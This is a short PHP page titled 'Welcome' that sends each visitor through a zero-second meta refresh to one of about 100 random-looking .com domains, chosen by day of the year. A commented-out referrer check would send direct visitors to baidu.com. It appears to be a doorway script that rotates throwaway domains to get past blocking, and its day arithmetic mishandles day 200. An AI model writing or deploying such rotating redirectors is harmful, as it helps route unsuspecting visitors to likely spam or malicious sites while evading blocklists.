<?php

//$ref=$_SERVER['HTTP_REFERER'];
//if(!isset($ref))
//{
//  header("location: https://www.baidu.com");
//}
$domain=array(
"sfjks123.com",
"dfsafa32211.com",
"afddasfs555.com",
"safadfsafh2.com",
"kljklga22211.com",
"dskfjkjgag22.com",
"sdfasfa3115.com",
"splgnang562.com",
"dsajifjg32265.com",
"fdsaofkhf255.com",
"dsafjdska5543.com",
"safs35481321.com",
"sffasjf331.com",
"sfdaf1r2.com",
"sfdafsj21jt.com",
"sfdafjlkj0j.com",
"kijgijig10.com",
"sfjj8jgijg.com",
"askjfkldsj2f.com",
"sfdjkjal2lj.com",
"skjfljg2ji5.com",
"fsdkajlkjlk20j.com",
"skjlkj29gj.com",
"jlkjglka0ga.com",
"sfjalkjf20.com",
"poopi10fa0.com",
"wiuuttpa92.com",
"poit2igj.com",
"pig2gokg.com",
"2pitpigja.com",
"jp29pokgp.com",
"itpiajgp2jpg.com",
"209gkpajg.com",
"2p9tkpg.com",
"029f9k.com",
"209ffkbb.com",
"2pgig0a.com",
"gpoi929kbb.com",
"2oigoia9gkv.com",
"29fi9ajgav.com",
"2098g09aj.com",
"sipogipoa.com",
"fjkl2jklfjlk2jf.com",
"29g9ib9b9a.com",
"29gf9ig9ai9gj.com",
"20g9igajg.com",
"g098bjajg.com",
"g9b8a9080g.com",
"fsdaj20.com",
"234k23j40.com",
"fjakfj20ll.com",
"234jlkj200.com",
"23j4lk2j00.com",
"skjfdlkj20.com",
"23ijj2jf.com",
"2jf2japj0j.com",
"j2jof2j0fa99.com",
"jjflksjl209f.com",
"kasjflj09j.com",
"jklsjflkaj049.com",
"jklsjklj2868.com",
"slkjflkasj9yjg9.com",
"jhg9j39jg.com",
"j92j9gj9ajg.com",
"jsklajfl29g9j.com",
"agakljga99j.com",
"29gjalgj02a.com",
"ajka0g9ja.com",
"gklagkljkga02.com",
"wjgkla0.com",
"29swaklag0.com",
"alkgjgjlnv.com",
"ngiag92n.com",
"bnvajg29.com",
"najglajlga02.com",
"gjblkjbla9.com",
"gjblnna92.com",
"blkjlajga929j.com",
"jkajljsa020.com",
"gjkaljglj209.com",
"gakljgklaj20.com",
"alkjgklblka9.com",
"galkj29gj9ag.com",
"joga09g9ja.com",
"gjlajg029jga.com",
"jgljalkjga92.com",
"galkjglka9g2.com",
"fajkjglab9a.com",
"29gajgaljga.com",
"g9agjkajlga0.com",
"galkjvvklajl02.com",
"gjaioj20jg9j2.com",
"fa298ja.com",
"29gajlkga.com",
"gkljalkgj29.com",
"gkljkgjn0.com",
"fakljfkl298g.com",
"29gjajga.com",
"g29jg09ajg.com",
"gakljglkaj.com"
);
$today = strtotime(date('Ymd'));
//echo $today;
//exit;
$year_start = strtotime(date('Y')."0101");
$days = ( $today - $year_start )/86400 + 1;
$num=intval($days);
if($num>=100 && $num<200)
{
  $num=$num-100;
}
if($num>200 && $num<300)
{
  $num=$num-200;
}
if($num>=300)
{
  $num=$num-300;
}
?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Welcome</title>

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<meta http-equiv="refresh" content="0; url=http://<?php echo $domain[$num];?>">

<body>

<div class="clear"> </div>
<div style="display:none;">
</div>
</body>
</html>